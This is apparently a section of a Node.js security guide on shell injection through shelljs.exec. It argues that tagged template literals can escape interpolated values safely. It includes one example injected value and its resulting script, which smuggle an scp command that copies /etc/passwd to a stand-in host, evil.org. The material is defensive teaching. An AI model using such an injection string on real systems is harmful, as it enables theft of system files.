# Shell injection

Threats: [SHP][]

The [`shelljs`][] module allows access to the system shell.  We focus
on `shelljs`, but similar arguments apply to builtins like
[`child_process.spawn(cmd, { shell: ... })`][cp.spawn] and similar
modules.

`shelljs` has some nice programmatic APIs for common shell commands
that escape arguments.

It also provides `shell.exec` which allows full access to the shell
including interpretation of shell meta characters.

Solving [shell injection][SHP] is a much harder problem than query
injection since shell scripts tend to call other shell scripts, so
properly escaping arguments to one script doesn't help if the script
sloppily composes a sub-shell.  The problem of tools that trust their
inputs is not limited to shell scripts: see discussion of image decoders
in [BOF][].  The [shell grammar][] has more layers of interpretation than
the SQL grammar.

We can do much better though.

```js
shelljs.exec("executable '" + x + "'")
```

is much more problematic than either of

```js
shelljs.exec`executable ${x}`

shelljs.exec`executable "${x}"`
```

The latter two know which strings come from the developer:
`["executable "]`, and which are inline expressions: `x`.
By properly escaping `x` we prevent a single
point of failure where an attacker who can cause

```js
x = " '; scp /etc/passwd evil@evil.org/; echo ' ";
```

causes execution of the following script

```js
executable ' '; scp /etc/passwd evil@evil.org/; echo ' '
```

The [accompanying example code][sh-code] includes a tag
implementation for `sh` and `bash` that recognizes nesting
contexts including double and single quoted strings, *heredoc*
streams, and sub-shells like `$(...)` and <code>&#96;...&#96;</code>.

[shell grammar]: http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_10
[`shelljs`]: https://www.npmjs.com/package/shelljs
[cp.spawn]: https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options
[SHP]: ../chapter-1/threat-SHP.md
[BOF]: ../chapter-1/threat-BOF.md
[sh-code]: https://github.com/google/node-sec-roadmap/tree/master/chapter-7/examples/sh
